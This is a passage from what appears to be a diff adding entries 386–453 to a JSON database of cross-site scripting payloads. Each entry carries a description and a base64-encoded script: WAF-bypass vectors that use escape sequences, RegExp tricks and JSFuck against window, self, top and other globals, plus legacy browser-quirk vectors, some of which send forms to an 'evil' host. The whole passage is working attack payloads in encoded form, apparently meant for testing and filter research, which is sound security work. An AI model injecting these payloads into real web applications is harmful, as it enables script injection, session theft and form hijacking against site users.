+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent), , , ",
+		"script" : "JztwYXJlbnRbJ1x4NjVceDc2XHg2MVx4NmMnXSgncGFyZW50WyJceDYxXHg2Y1x4NjVceDcyXHg3NCJdKHBhcmVudFsiXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 387,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames), , , ",
+		"script" : "JztmcmFtZXNbJ1x4NjVceDc2XHg2MVx4NmMnXSgnZnJhbWVzWyJceDYxXHg2Y1x4NjVceDcyXHg3NCJdKGZyYW1lc1siXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 388,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWydceDY1XHg3Nlx4NjFceDZjJ10oJ2dsb2JhbFRoaXNbIlx4NjFceDZjXHg2NVx4NzJceDc0Il0oZ2xvYmFsVGhpc1siXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 389,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (window), , , ",
+		"script" : "Jzt3aW5kb3dbJ1wxNDFcMTU0XDE0NVwxNjJcMTY0J10oJ1wxMzBcMTIzXDEyMycpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 390,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (self), , , ",
+		"script" : "JztzZWxmWydcMTQxXDE1NFwxNDVcMTYyXDE2NCddKCdcMTMwXDEyM1wxMjMnKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 391,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (this), , , ",
+		"script" : "Jzt0aGlzWydcMTQxXDE1NFwxNDVcMTYyXDE2NCddKCdcMTMwXDEyM1wxMjMnKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 392,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (top), , , ",
+		"script" : "Jzt0b3BbJ1wxNDFcMTU0XDE0NVwxNjJcMTY0J10oJ1wxMzBcMTIzXDEyMycpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 393,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (parent), , , ",
+		"script" : "JztwYXJlbnRbJ1wxNDFcMTU0XDE0NVwxNjJcMTY0J10oJ1wxMzBcMTIzXDEyMycpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 394,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (frames), , , ",
+		"script" : "JztmcmFtZXNbJ1wxNDFcMTU0XDE0NVwxNjJcMTY0J10oJ1wxMzBcMTIzXDEyMycpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 395,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: octal escape sequence (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWydcMTQxXDE1NFwxNDVcMTYyXDE2NCddKCdcMTMwXDEyM1wxMjMnKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 396,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (window), , , ",
+		"script" : "Jzt3aW5kb3dbJ1x1ezAwNjF9XHV7MDA2Y31cdXswMDY1fVx1ezAwNzJ9XHV7MDA3NH0nXSgnXHV7MDA1OH1cdXswMDUzfVx1ezAwNTN9Jyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 397,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (self), , , ",
+		"script" : "JztzZWxmWydcdXswMDYxfVx1ezAwNmN9XHV7MDA2NX1cdXswMDcyfVx1ezAwNzR9J10oJ1x1ezAwNTh9XHV7MDA1M31cdXswMDUzfScpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 398,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (this), , , ",
+		"script" : "Jzt0aGlzWydcdXswMDYxfVx1ezAwNmN9XHV7MDA2NX1cdXswMDcyfVx1ezAwNzR9J10oJ1x1ezAwNTh9XHV7MDA1M31cdXswMDUzfScpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 399,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (top), , , ",
+		"script" : "Jzt0b3BbJ1x1ezAwNjF9XHV7MDA2Y31cdXswMDY1fVx1ezAwNzJ9XHV7MDA3NH0nXSgnXHV7MDA1OH1cdXswMDUzfVx1ezAwNTN9Jyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 400,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (parent), , , ",
+		"script" : "JztwYXJlbnRbJ1x1ezAwNjF9XHV7MDA2Y31cdXswMDY1fVx1ezAwNzJ9XHV7MDA3NH0nXSgnXHV7MDA1OH1cdXswMDUzfVx1ezAwNTN9Jyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 401,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (frames), , , ",
+		"script" : "JztmcmFtZXNbJ1x1ezAwNjF9XHV7MDA2Y31cdXswMDY1fVx1ezAwNzJ9XHV7MDA3NH0nXSgnXHV7MDA1OH1cdXswMDUzfVx1ezAwNTN9Jyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 402,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: unicode escape (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWydcdXswMDYxfVx1ezAwNmN9XHV7MDA2NX1cdXswMDcyfVx1ezAwNzR9J10oJ1x1ezAwNTh9XHV7MDA1M31cdXswMDUzfScpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 403,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (window), , , ",
+		"script" : "Jzt3aW5kb3dbL2FsLy5zb3VyY2UrL2VydC8uc291cmNlXSgvWFNTLy5zb3VyY2UpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 404,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (self), , , ",
+		"script" : "JztzZWxmWy9hbC8uc291cmNlKy9lcnQvLnNvdXJjZV0oL1hTUy8uc291cmNlKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 405,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (this), , , ",
+		"script" : "Jzt0aGlzWy9hbC8uc291cmNlKy9lcnQvLnNvdXJjZV0oL1hTUy8uc291cmNlKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 406,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (top), , , ",
+		"script" : "Jzt0b3BbL2FsLy5zb3VyY2UrL2VydC8uc291cmNlXSgvWFNTLy5zb3VyY2UpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 407,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (parent), , , ",
+		"script" : "JztwYXJlbnRbL2FsLy5zb3VyY2UrL2VydC8uc291cmNlXSgvWFNTLy5zb3VyY2UpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 408,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (frames), , , ",
+		"script" : "JztmcmFtZXNbL2FsLy5zb3VyY2UrL2VydC8uc291cmNlXSgvWFNTLy5zb3VyY2UpOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 409,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: RegExp source property (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWy9hbC8uc291cmNlKy9lcnQvLnNvdXJjZV0oL1hTUy8uc291cmNlKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 410,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (window), , , ",
+		"script" : "Jzt3aW5kb3dbKCt7fStbXSlbKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dKCgre30rW10pWyshIVtdXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 411,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (self), , , ",
+		"script" : "JztzZWxmWygre30rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dXSgoK3t9K1tdKVsrISFbXV0pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 412,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (this), , , ",
+		"script" : "Jzt0aGlzWygre30rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dXSgoK3t9K1tdKVsrISFbXV0pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 413,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (top), , , ",
+		"script" : "Jzt0b3BbKCt7fStbXSlbKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dKCgre30rW10pWyshIVtdXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 414,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (parent), , , ",
+		"script" : "JztwYXJlbnRbKCt7fStbXSlbKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dKCgre30rW10pWyshIVtdXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 415,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (frames), , , ",
+		"script" : "JztmcmFtZXNbKCt7fStbXSlbKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dKCgre30rW10pWyshIVtdXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 416,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWygre30rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dXSgoK3t9K1tdKVsrISFbXV0pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 417,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Image src with JavaScript protocol, , , ",
+		"script" : "PGltZyBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 418,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Body background with JavaScript protocol, , , ",
+		"script" : "PGJvZHkgYmFja2dyb3VuZD0iamF2YXNjcmlwdDphbGVydCgxKSI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 419,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Iframe data urls no longer work as modern browsers use a null origin, , , ",
+		"script" : "PGlmcmFtZSBzcmM9ImRhdGE6dGV4dC9odG1sLDxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 420,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "VBScript protocol used to work in IE, , , ",
+		"script" : "PGEgaHJlZj0idmJzY3JpcHQ6TXNnQm94KzEiPlhTUzwvYT4gPGEgaHJlZj0iIyIgb25jbGljaz0idmJzOk1zZ2JveCsxIj5YU1M8L2E+IDxhIGhyZWY9IiMiIG9uY2xpY2s9IlZCUzpNc2dib3grMSI+WFNTPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJ2YnNjcmlwdDpNc2dib3grMSI+WFNTPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJWQlNDUklQVDpNc2dib3grMSI+WFNTPC9hPiA8YSBocmVmPSIjIiBsYW5ndWFnZT12YnMgb25jbGljaz0idmJzY3JpcHQ6TXNnYm94KzEiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 421,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "JScript compact was a minimal version of JS that wasn't widely used in IE, , , ",
+		"script" : "PGEgaHJlZj0iIyIgb25jbGljaz0ianNjcmlwdC5jb21wYWN0OmFsZXJ0KDEpOyI+dGVzdDwvYT4gPGEgaHJlZj0iIyIgb25jbGljaz0iSlNDUklQVC5DT01QQUNUOmFsZXJ0KDEpOyI+dGVzdDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 422,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "JScript.Encode allows encoded JavaScript, , , ",
+		"script" : "PGEgaHJlZj0jIGxhbmd1YWdlPSJKU2NyaXB0LkVuY29kZSIgb25jbGljaz0iI0B+XkNBQUFBQT09Q14rLkRgOCNtZ0lBQUE9PV4jfkAiPlhTUzwvYT4gPGEgaHJlZj0jIG9uY2xpY2s9IkpTY3JpcHQuRW5jb2RlOiNAfl5DQUFBQUE9PUNeKy5EYDgjbWdJQUFBPT1eI35AIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 423,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "VBScript.Encoded allows encoded VBScript, , , ",
+		"script" : "PGlmcmFtZSBvbmxvYWQ9VkJTY3JpcHQuRW5jb2RlOiNAfl5DQUFBQUE9PVxrbyRLNixGb1FJQUFBPT1eI35APiA8aWZyYW1lIGxhbmd1YWdlPVZCU2NyaXB0LkVuY29kZSBvbmxvYWQ9I0B+XkNBQUFBQT09XGtvJEs2LEZvUUlBQUE9PV4jfkA+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 424,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "JavaScript entities used to work in Netscape Navigator, , , ",
+		"script" : "PGEgdGl0bGU9IiZ7YWxlcnQoMSl9Ij5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 425,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "JavaScript stylesheets used to be supported by Netscape Navigator, , , ",
+		"script" : "PGxpbmsgaHJlZj0ieHNzLmpzIiByZWw9c3R5bGVzaGVldCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 426,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Button used to consume markup, , , ",
+		"script" : "PGZvcm0+PGJ1dHRvbiBuYW1lPXggZm9ybWFjdGlvbj14PjxiPnN0ZWFsbWU=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 427,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "IE9 select elements and plaintext used to consume markup, , , ",
+		"script" : "PGZvcm0gYWN0aW9uPXg+PGJ1dHRvbj5YU1M8L2J1dHRvbj48c2VsZWN0IG5hbWU9eD48b3B0aW9uPjxwbGFpbnRleHQ+PHNjcmlwdD50b2tlbj0ic3VwZXJzZWNyZXQiPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 428,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "XBL Firefox only <= 2, , , ",
+		"script" : "PGRpdiBzdHlsZT0iLW1vei1iaW5kaW5nOnVybCgvL2J1c2luZXNzaW5mby5jby51ay9sYWJzL3hibC94YmwueG1sI3hzcykiPiA8ZGl2IHN0eWxlPSJcLVxtb1x6LWJpbmRpbmc6dXJsKC8vYnVzaW5lc3NpbmZvLmNvLnVrL2xhYnMveGJsL3hibC54bWwjeHNzKSI+IDxkaXYgc3R5bGU9Ii1tb3otYmluZGluXDY3OnVybCgvL2J1c2luZXNzaW5mby5jby51ay9sYWIgcy94YmwveGJsLnhtbCN4c3MpIj4gPGRpdiBzdHlsZT0iLW1vei1iaW5kaW4mI3g1Yzs2Nzp1cmwoLy9idXNpbmVzc2luZm8uY28udWsvbGFiIHMveGJsL3hibC54bWwjeHNzKSI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 429,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "XBL also worked in FF3.5 using data urls, , , ",
+		"script" : "PGltZyBzcmM9ImJsYWgiIHN0eWxlPSItbW96LWJpbmRpbmc6IHVybChkYXRhOnRleHQveG1sO2NoYXJzZXQ9dXRmLTgsJTNDJTNGeG1sJTIwdmVyc2lvbiUzRCUyMjEuMCUyMiUzRiUzRSUzQ2JpbmRpbmdzJTIweG1sbnMlM0QlMjIgaHR0cCUzQS8vd3d3Lm1vemlsbGEub3JnL3hibCUyMiUzRSUzQ2JpbmRpbmclMjBpZCUzRCUyMmxvYWRlciUyMiUzRSUzQ2ltcGxlbWVudGF0aW9uJTNFJTNDY29uc3RydWN0b3IlM0UlM0MlMjElNUJDREFUQSU1QnZhciUyMHVybCUyMCUzRCUyMCUyMmFsZXJ0LmpzICUyMiUzQiUyMHZhciUyMHNjciUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQlMjglMjJzY3JpcHQlMjIlMjklM0IlMjBzY3Iuc2V0QXR0cmlidXRlJTI4JTIyc3JjJTIyJTJDdXJsJTI5JTNCJTIwdmFyJTIwYm9keUVsZW1lbnQlMjAlM0QlMjAgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUlMjglMjJodG1sJTIyJTI5Lml0ZW0lMjgwJTI5JTNCJTIwYm9keUVsZW1lbnQuYXBwZW5kQ2hpbGQlMjhzY3IlMjklM0IlMjAlNUQlNUQlM0UlM0MvY29uc3RydWN0b3IlM0UlM0MvaW1wbGVtZW50YXRpb24lM0UlM0MvIGJpbmRpbmclM0UlM0MvYmluZGluZ3MlM0UpIiAvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 430,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "CSS expressions <=IE7, , , ",
+		"script" : "PGRpdiBzdHlsZT14c3M6ZXhwcmVzc2lvbihhbGVydCgxKSk+IDxkaXYgc3R5bGU9eHNzOmV4cHJlc3Npb24oMSktYWxlcnQoMSk+IDxkaXYgc3R5bGU9eHNzOmV4cHJlc3Npb1w2ZShhbGVydCgxKSk+IDxkaXYgc3R5bGU9eHNzOmV4cHJlc3Npb1wwMDZlKGFsZXJ0KDEpKT4gPGRpdiBzdHlsZT14c3M6ZXhwcmVzc2lvXDAwMDA2ZShhbGVydCgxKSk+IDxkaXYgc3R5bGU9eHNzOmV4cHJlc3Npb1w2ZShhbGVydCgxKSk+IDxkaXYgc3R5bGU9eHNzOmV4cHJlc3NpbyYjeDVjOzZlKGFsZXJ0KDEpKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 431,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "In quirks mode IE allowed you to use = instead of :, , , ",
+		"script" : "PGRpdiBzdHlsZT14c3M9ZXhwcmVzc2lvbihhbGVydCgxKSk+IDxkaXYgc3R5bGU9ImNvbG9yJiN4M2RyZWQiPnRlc3Q8L2Rpdj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 432,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Behaviors for older modes of IE, , , ",
+		"script" : "PGEgc3R5bGU9ImJlaGF2aW9yOnVybCgjZGVmYXVsdCNBbmNob3JDbGljayk7IiBmb2xkZXI9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 433,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Older versions of IE supported event handlers in functions, , , ",
+		"script" : "PHNjcmlwdD4gZnVuY3Rpb24gd2luZG93Lm9ubG9hZCgpeyBhbGVydCgxKTsgfSA8L3NjcmlwdD4gPHNjcmlwdD4gZnVuY3Rpb24gd2luZG93OjpvbmxvYWQoKXsgYWxlcnQoMSk7IH0gPC9zY3JpcHQ+IDxzY3JpcHQ+IGZ1bmN0aW9uIHdpbmRvdy5sb2NhdGlvbigpeyB9IDwvc2NyaXB0PiA8Ym9keT4gPHNjcmlwdD4gZnVuY3Rpb24vKjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydCgxKT4qL2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MKCl7fSA8L3NjcmlwdD4gPC9ib2R5PiA8Ym9keT4gPHNjcmlwdD4gZnVuY3Rpb24gZG9jdW1lbnQuYm9keS5pbm5lckhUTUwoKXsgeCA9ICI8aW1nIHNyYz0xIG9uZXJyb3I9YWxlcnQoMSk+IjsgfSA8L3NjcmlwdD4gPC9ib2R5Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 434,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "GreyMagic HTML+time exploit (no longer works even in 5 docmode), , , ",
+		"script" : "PEhUTUw+PEJPRFk+PD94bWw6bmFtZXNwYWNlIHByZWZpeD0idCIgbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206dGltZSI+PD9pbXBvcnQgbmFtZXNwYWNlPSJ0IiBpbXBsZW1lbnRhdGlvbj0iI2RlZmF1bHQjdGltZTIiPjx0OnNldCBhdHRyaWJ1dGVOYW1lPSJpbm5lckhUTUwiIHRvPSJYU1M8aW1nIHNyYz0xIG9uZXJyb3I9YWxlcnQoMSk+Ij4gPC9CT0RZPjwvSFRNTD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 435,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Firefox allows NULLS after &, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdCYjeDZhO2F2YXNjcmlwdDphbGVydCgxKSI+RmlyZWZveDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 436,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Firefox allows NULLs inside named entities, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdCZjb2xvbjthbGVydCgxKSI+RmlyZWZveDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 437,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Firefox allows NULL characters inside opening comments, , , ",
+		"script" : "PCEtLSA+PGltZyB0aXRsZT0iLS0+PGlmcmFtZS9vbmxvYWQ9YWxlcnQoMSk+Ij4gLS0+IDwhLS0gPjxpbWcgdGl0bGU9Ii0tPjxpZnJhbWUvb25sb2FkPWFsZXJ0KDEpPiI+IC0tPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 438,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Safari used to allow any tag to have a onload event inside SVG, , , ",
+		"script" : "PHN2Zz48eHNzIG9ubG9hZD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 439,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Isindex using src attribute, , , ",
+		"script" : "PGlzaW5kZXggdHlwZT1pbWFnZSBzcmM9Ii8vZXZpbD8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 440,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Isindex using submit, , , ",
+		"script" : "PGlzaW5kZXggdHlwZT1zdWJtaXQgc3R5bGU9d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTsgdmFsdWU9WFNTIGZvcm1hY3Rpb249Ii8vZXZpbD8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 441,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Isindex and formaction, , , ",
+		"script" : "PGlzaW5kZXggdHlwZT1zdWJtaXQgZm9ybWFjdGlvbj1qYXZhc2NyaXB0OmFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 442,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Isindex and action, , , ",
+		"script" : "PGlzaW5kZXggdHlwZT1zdWJtaXQgYWN0aW9uPWphdmFzY3JpcHQ6YWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 443,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "discard tag and onbegin, , , ",
+		"script" : "PHN2Zz48ZGlzY2FyZCBvbmJlZ2luPWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 444,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Use element with an external URL, , , ",
+		"script" : "PHN2Zz48dXNlIGhyZWY9Ii8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC91c2VfZWxlbWVudC91cGxvYWQucGhwI3giIC8+PC9zdmc+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 445,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "onloadstart event for media elements in Firefox v107 and below, , , ",
+		"script" : "PGltZyBzcmM9dmFsaWRpbWFnZS5wbmcgb25sb2Fkc3RhcnQ9YWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 446,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "onloadend event for media elements in Firefox v107 and below, , , ",
+		"script" : "PGlucHV0IHR5cGU9aW1hZ2Ugb25sb2FkZW5kPWFsZXJ0KDEpIHNyYz12YWxpZGltYWdlLnBuZz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 447,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "onbounce event for marquee element in Firefox v125 and below, , , ",
+		"script" : "PG1hcnF1ZWUgd2lkdGg9MSBsb29wPTEgb25ib3VuY2U9YWxlcnQoMSk+WFNTPC9tYXJxdWVlPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 448,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "onfinish event for marquee element in Firefox v125 and below, , , ",
+		"script" : "PG1hcnF1ZWUgd2lkdGg9MSBsb29wPTEgb25maW5pc2g9YWxlcnQoMSk+WFNTPC9tYXJxdWVlPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 449,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "onstart event for marquee element in Firefox v125 and below, , , ",
+		"script" : "PG1hcnF1ZWUgb25zdGFydD1hbGVydCgxKT5YU1M8L21hcnF1ZWU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 450,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Assignable protocol with location, , , ",
+		"script" : "PHNjcmlwdD5sb2NhdGlvbi5wcm90b2NvbD0namF2YXNjcmlwdCc8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 451,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Assignable protocol with anchor, , , ",
+		"script" : "PGEgaHJlZj0iJTBhYWxlcnQoMSkiIG9uY2xpY2s9InByb3RvY29sPSdqYXZhc2NyaXB0JyI+dGVzdDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 452,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Data URL with use element and base64 encoded, , , ",
+		"script" : "PHN2Zz48dXNlIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QnBaRDBuZUNjZ2VHMXNibk05SjJoMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZjM1puSnlCNGJXeHVjenA0YkdsdWF6MG5hSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3ZNVGs1T1M5NGJHbHVheWNnZDJsa2RHZzlKekV3TUNjZ2FHVnBaMmgwUFNjeE1EQW5QZ284YVcxaFoyVWdhSEpsWmowaU1TSWdiMjVsY25KdmNqMGlZV3hsY25Rb01Ta2lJQzgrQ2p3dmMzWm5QZz09I3giIC8+PC9zdmc+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 453,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Data URL with use element, , , ",
